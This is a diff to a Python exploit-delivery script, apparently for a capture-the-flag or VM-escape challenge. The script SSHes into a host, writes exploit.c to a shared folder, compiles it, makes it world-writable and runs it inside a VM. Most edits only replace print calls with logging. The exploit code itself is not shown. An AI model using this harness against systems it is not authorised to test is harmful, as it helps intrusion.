@@ -19,7 +19,7 @@ def send_and_print(shell, cmd, timeout=10):
     else:
         display = cmd
 
-    print(f"[HOST] $ {display}")
+    log.info(f"[HOST] $ {display}")
 
     shell.sendline(cmd)
 
@@ -36,14 +36,12 @@ def send_and_print(shell, cmd, timeout=10):
             break
 
     if output:
-        print(output.decode(errors='replace').strip())
+        log.info(output.decode(errors='replace').strip())
 
     return output
 
 
 def main():
-    print(f"[*] Connecting to {HOST}:{PORT}...")
-
     conn = ssh(
         host=HOST,
         port=PORT,
@@ -53,12 +51,11 @@ def main():
     )
 
     if not conn.connected():
-        print("[-] SSH connection failed")
+        log.failure("SSH connection failed")
         sys.exit(1)
 
-    print("[+] SSH connected")
 
-    print("[*] Launching ./run...")
+    log.info("Launching ./run...")
 
     vm = conn.run('./run')
 
@@ -74,42 +71,42 @@ def main():
         if not line:
             continue
 
-        print("[VM] " + line.decode(errors='replace').rstrip())
+        log.info(f"[VM] {line.decode(errors='replace').rstrip()}")
 
         if b"A share will be available: host:" in line:
             match = re.search(rb'host:([^\s]+)', line)
 
             if match:
                 share_path = match.group(1).decode()
-                print(f"[+] Share path: {share_path}")
+                log.info(f"Share path: {share_path}")
                 break
 
     if not share_path:
-        print("[-] Failed to determine share path")
+        log.failure("Failed to determine share path")
         vm.close()
         conn.close()
         sys.exit(1)
 
-    print("[*] Opening host shell...")
+    log.failure("Opening host shell...")
 
     host = conn.shell()
 
     try:
         host.recvuntil(b'$ ', timeout=10)
     except Exception:
-        print("[-] Failed to get host shell")
+        log.failure("[-] Failed to get host shell")
         vm.close()
         conn.close()
         sys.exit(1)
 
-    print("[+] Host shell ready")
+    log.info("Host shell ready")
 
     send_and_print(
         host,
         f"cd {share_path}".encode()
     )
 
-    print("[*] Writing exploit.c...")
+    log.info("Writing exploit.c...")
 
     with open(C_CODE_PATH) as f: 
         exploit_code = f.read()
@@ -125,15 +122,14 @@ def main():
     try:
         host.recvuntil(b'$ ', timeout=10)
     except Exception:
-        print("[-] Failed to create exploit.c")
+        log.failure("Failed to create exploit.c")
         host.close()
         vm.close()
         conn.close()
         sys.exit(1)
 
-    print("[+] exploit.c written")
-
-    print("[*] Compiling...")
+    log.info("exploit.c written")
+    log.info("Compiling...")
 
     compile_output = send_and_print(
         host,
@@ -142,7 +138,7 @@ def main():
     )
 
     if b"error:" in compile_output.lower():
-        print("[-] Compilation failed")
+        log.failure("Compilation failed")
         host.close()
         vm.close()
         conn.close()
@@ -152,23 +148,22 @@ def main():
     send_and_print(host, b"ls -lh exploit")
     send_and_print(host, b"chmod 777 exploit")
 
-    print("[+] Compilation complete")
+    log.info("Compilation complete")
 
     host.close()
 
-    print("[*] Waiting for VM shell...")
+    log.info("Waiting for VM shell...")
 
     try:
         vm.recvuntil(b'$ ', timeout=20)
     except Exception:
-        print("[-] VM shell did not appear")
+        log.failure("VM shell did not appear")
         vm.close()
         conn.close()
         sys.exit(1)
 
-    print("[+] VM shell ready")
-
-    print("[*] Checking shared exploit...")
+    log.info("VM shell ready")
+    log.info("Checking shared exploit...")
 
     vm.sendline(b"ls -lh /mnt/share/exploit")
 
@@ -188,7 +183,7 @@ def main():
         conn.close()
         sys.exit(1)
 
-    print("[*] Executing exploit...")
+    log.info("Executing exploit...")
 
     vm.sendline(b"/mnt/share/exploit 2>&1")
 
@@ -216,15 +211,8 @@ def main():
     print(output.decode(errors='replace'))
     print("=============================================")
 
-    try:
-        vm.close()
-    except Exception:
-        pass
-
-    try:
-        conn.close()
-    except Exception:
-        pass
+    vm.close()
+    conn.close()
 
 
 if __name__ == '__main__':
